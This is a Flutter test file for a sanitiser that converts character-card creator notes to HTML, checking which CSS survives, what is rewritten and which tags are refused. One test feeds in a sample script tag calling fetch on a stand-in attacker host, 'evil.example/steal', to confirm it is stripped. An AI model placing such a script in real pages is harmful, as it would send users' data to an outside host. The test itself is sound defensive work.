import 'package:flutter_test/flutter_test.dart';
import 'package:maichat/services/rich_notes.dart';

/// The creator-notes CSS pass. These are string-level assertions on purpose: the
/// rendering side is covered by the sheet's widget tests, but *what survives the
/// rewrite* is where a card either looks like its author intended or looks like a
/// grey slab, and that is decidable without a render tree.
void main() {
  group('what is kept', () {
    test('a card keeps its own background, padding and colours', () {
      const notes = '<div style="background:#101018; padding:14px; '
          'color:#e8e8f0; border:1px solid #333">Hello</div>';
      final html = creatorNotesToHtml(notes);
      // The chat's renderer strips a wrapper's background; the notes renderer
      // must not — here the styled block *is* the content.
      expect(html, contains('background-color: #101018'));
      expect(html, contains('padding: 14px'));
      expect(html, contains('color: #e8e8f0'));
      expect(html, contains('border: 1px solid #333'));
    });

    test('a gradient degrades to its first colour rather than disappearing',
        () {
      const notes = '<div style="background: linear-gradient(#ff8800, #222)">'
          'x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('background-color: #ff8800'));
    });

    test('a bare colour keyword survives the shorthand narrowing', () {
      final html = creatorNotesToHtml('<p style="background: teal">x</p>');
      expect(html, contains('background-color: teal'));
    });

    test('a <style> block is kept and its rules are tamed too', () {
      const notes = '<style>.card { background: #202030; display: flex; '
          'font-size: 1.5rem }</style><div class="card">x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('<style>'));
      expect(html, contains('background-color: #202030'));
      // flex would have stacked the children into one paragraph.
      expect(html, contains('display: block'));
      expect(html, isNot(contains('flex')));
      expect(html, contains('font-size: 24px'));
    });

    test('images are left in place for the renderer to handle', () {
      final html = creatorNotesToHtml(
          '<img src="https://example.com/banner.png" width="400">');
      expect(html, contains('src="https://example.com/banner.png"'));
      expect(html, contains('width="400"'));
    });

    test('markdown is honoured, so a plainly-written card still formats', () {
      final html = creatorNotesToHtml('**Bold** and *italic*.');
      expect(html, contains('<strong>Bold</strong>'));
      expect(html, contains('<em>italic</em>'));
    });
  });

  group('what is rewritten', () {
    test('rem sizes become px, because rem is not parsed at all', () {
      final html =
          creatorNotesToHtml('<h2 style="font-size:1.4rem">Aria</h2>');
      expect(html, contains('font-size: 22px'));
      expect(html, isNot(contains('rem')));
    });

    test('flex, grid and positioning are dropped, not passed through', () {
      const notes = '<div style="display:flex; justify-content:center; '
          'position:absolute; top:10px; z-index:5; gap:8px">x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('display: block'));
      for (final gone in ['justify-content', 'position', 'top:', 'z-index',
        'gap']) {
        expect(html, isNot(contains(gone)), reason: '$gone survived');
      }
    });

    test('shadows, filters and transforms are dropped', () {
      const notes = '<div style="box-shadow:0 0 8px #000; filter:blur(2px); '
          'transform:rotate(3deg); color:#fff">x</div>';
      final html = creatorNotesToHtml(notes);
      expect(html, contains('color: #fff'));
      expect(html, isNot(contains('box-shadow')));
      expect(html, isNot(contains('filter')));
      expect(html, isNot(contains('transform')));
    });

    test('an element left with no drawable style loses the attribute entirely',
        () {
      final html = creatorNotesToHtml('<div style="box-shadow:0 0 2px #000">'
          'x</div>');
      expect(html, isNot(contains('style=')));
      expect(html, contains('x'));
    });
  });

  group('what is refused', () {
    test('a script is removed, source and all', () {
      final html = creatorNotesToHtml(
          '<p>Hi</p><script>fetch("https://evil.example/steal")</script>');
      expect(html, contains('Hi'));
      expect(html, isNot(contains('script')));
      expect(html, isNot(contains('evil.example')));
    });

    test('an iframe and its contents go', () {
      final html = creatorNotesToHtml(
          '<iframe src="https://example.com/page">fallback</iframe>after');
      expect(html, isNot(contains('iframe')));
      expect(html, contains('after'));
    });

    test('unrenderable interactive tags are dropped but their text is kept', () {
      final html = creatorNotesToHtml(
          '<div>before <button>Click me</button> after</div>');
      expect(html, isNot(contains('button')));
      expect(html, contains('before'));
      expect(html, contains('Click me'));
      expect(html, contains('after'));
    });

    test('every dropped tag is also refused at render time', () {
      // The two lists must agree, or a tag the string pass misses (because the
      // HTML parser reconstructed it) would still build.
      expect(kDroppedNoteTags, contains('script'));
      expect(kDroppedNoteTags, contains('iframe'));
      expect(kDroppedNoteTags, contains('form'));
    });
  });

  group('the cheap path', () {
    test('plain prose is not treated as rich', () {
      expect(notesLookRich('She works nights at the archive. 3 < 5 & so on.'),
          isFalse);
    });

    test('anything with real markup is', () {
      expect(notesLookRich('<div style="color:red">x</div>'), isTrue);
      expect(notesLookRich('a <b>bold</b> word'), isTrue);
      expect(notesLookRich('<img src="x.png">'), isTrue);
    });

    test('empty notes convert to nothing at all', () {
      expect(creatorNotesToHtml('   '), isEmpty);
    });
  });

  group('cost', () {
    test('a large card converts once and quickly', () {
      // A pathological card: 400 styled rows, well past anything real.
      final notes = StringBuffer();
      for (var i = 0; i < 400; i++) {
        notes.write('<div style="background:#101018; padding:4px; '
            'font-size:0.9rem; box-shadow:0 0 2px #000">Row $i</div>');
      }
      final source = notes.toString();
      final watch = Stopwatch()..start();
      final html = creatorNotesToHtml(source);
      watch.stop();
      expect(html, contains('Row 399'));
      // Generous, because a CI runner is not a phone — this is a guard against
      // an accidentally quadratic rewrite, not a benchmark.
      expect(watch.elapsedMilliseconds, lessThan(1500));
    });

    test('the conversion is deterministic, so caching it by source is sound',
        () {
      const notes = '<div style="background:#123456; font-size:1.1rem">x</div>';
      expect(creatorNotesToHtml(notes), creatorNotesToHtml(notes));
    });
  });
}
